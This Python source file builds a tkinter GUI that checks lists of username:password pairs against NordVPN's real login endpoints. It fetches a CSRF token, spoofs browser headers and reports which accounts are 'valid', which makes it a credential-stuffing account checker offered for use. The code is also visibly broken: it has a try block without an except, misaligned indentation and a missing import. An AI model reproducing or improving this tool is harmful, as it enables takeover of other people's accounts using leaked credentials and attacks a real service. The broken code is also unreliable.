import tkinter as tk
import requests
import threading
import time
import queue

class NordVPNLoginGUI:
    def __init__(self, master):
        self.master = master
        master.title("NordVPN Login GUI")

        # Create frames
        self.accounts_frame = tk.Frame(master)
        self.accounts_frame.pack(fill="x")

        self.button_frame = tk.Frame(master)
        self.button_frame.pack(fill="x")

        # Create accounts label and text area
        self.accounts_label = tk.Label(self.accounts_frame, text="Accounts (username:password):")
        self.accounts_label.pack(side="left")

        self.accounts_text = tk.Text(self.accounts_frame, width=40, height=10)
        self.accounts_text.pack(side="left")

        # Create button
        self.login_button = tk.Button(self.button_frame, text="Check Accounts", command=self.check_accounts)
        self.login_button.pack(side="left")

        # Create result text area
        self.result_text = tk.Text(self.master, width=40, height=10)
        self.result_text.pack(fill="both", expand=True)

        # Create a queue to update the GUI
        self.queue = queue.Queue()

        # Store the CSRF token
        self.csrf_token = None

    def check_accounts(self):
        accounts = self.accounts_text.get("1.0", "end-1c")

        if not accounts:
            messagebox.showerror("Error", "Please enter accounts")
            return

        accounts_list = [line.strip() for line in accounts.split("\n") if line.strip()]

        threading.Thread(target=self.check_accounts_thread, args=(accounts_list,)).start()

    def check_accounts_thread(self, accounts_list):
        # Fetch CSRF token dynamically
        self.csrf_token = self.get_csrf_token()
        if not self.csrf_token:
            self.queue.put("Error fetching CSRF token\n")
            return

        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://nordaccount.com',
            'Referer': 'https://nordaccount.com/login/identifier?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea',
            'Sec-Ch-Ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'Sec-Ch-Ua-Mobile': '?0',
            'Sec-Ch-Ua-Platform': 'Windows',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
        }

        data = {
            '_csrf': self.csrf_token
        }

        for account in accounts_list:
            username, password = account.split(":")

            # First, send the username
            data['username'] = username
            try:
                            response = requests.post('https://nordaccount.com/login/identifier?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea', headers=headers, data=data)
            if response.status_code != 200:
                self.queue.put(f"Error sending username for account {account}\n")
                continue

            # Then, send the password
            data['password'] = password
            try:
                response = requests.post('https://nordaccount.com/login/password?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea', headers=headers, data=data)
                if response.status_code == 200:
                    self.queue.put(f"Account {account} is valid!\n")
                else:
                    self.queue.put(f"Account {account} is invalid\n")
            except requests.exceptions.RequestException as e:
                self.queue.put(f"Error sending password for account {account}: {str(e)}\n")

            time.sleep(1)  # add a delay between requests

    def get_csrf_token(self):
        try:
            response = requests.get('https://nordaccount.com/login/identifier?_ga=2.194206509.1053861864.1721927782-1672058283.1719281787&challenge=4%7C7c7917aa844a45208769ac48e0eb96ea')
            response.raise_for_status()
            csrf_token = response.cookies.get('_csrf')
            return csrf_token
        except requests.exceptions.RequestException as e:
            print(f"Error fetching CSRF token: {str(e)}")
            return None

    def update_gui(self):
        while True:
            try:
                message = self.queue.get_nowait()
                self.result_text.insert("end", message)
                self.result_text.see("end")
            except queue.Empty:
                break
            self.master.after(100, self.update_gui)

root = tk.Tk()
my_gui = NordVPNLoginGUI(root)
my_gui.update_gui()
root.mainloop()
